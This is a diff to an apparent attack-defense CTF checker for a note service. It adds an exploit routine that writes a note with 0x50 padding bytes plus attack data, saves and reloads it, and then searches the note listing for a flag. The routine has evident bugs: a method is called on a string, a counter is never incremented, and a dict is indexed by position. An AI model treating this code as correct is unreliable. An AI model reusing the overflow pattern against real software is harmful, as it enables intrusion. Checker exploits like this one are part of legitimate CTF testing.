@@ -9,6 +9,7 @@ from logging import LoggerAdapter
 from enochecker3 import (
     ChainDB,
     Enochecker,
+    ExploitCheckerTaskMessage,
     FlagSearcher,
     BaseCheckerTaskMessage,
     PutflagCheckerTaskMessage,
@@ -318,17 +319,26 @@ async def havoc1(task: HavocCheckerTaskMessage):
 async def havoc2(task: HavocCheckerTaskMessage):
     pass
 
-
-
 @checker.exploit(0)
-async def exploit_test(searcher: FlagSearcher, sock: AsyncSocket) -> Optional[str]:
-    r = await client.get(
-        "/note/*",
-    )
-    assert not r.is_error
+async def exploit_test(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, sock: AsyncSocket, logger:LoggerAdapter) -> Optional[str]:
+    username, password = generate_creds()
+    async with BambiNoteClient(task, logger) as client:
+        await client.register(username, password)
+        await client.create_note(5, b"A" * 0x50 + task.attack_info)
+        await client.save_note(5, "exploit_123")
+        await client.load_note(0, "exploit_123")
+        notes = await client.list_notes()
 
-    if flag := searcher.search_flag(r.text):
-        return flag
+        note_ctr = 1
+        for note in notes['saved']:
+            if note == "." or note == "..":
+                continue
+            
+            await note.load_note(note_ctr, note)
+            notes = await client.list_notes()
+            foo = searcher.search_flag(notes[1]) 
+            if foo is not None:
+                return foo
 
 if __name__ == "__main__":
     checker.run()
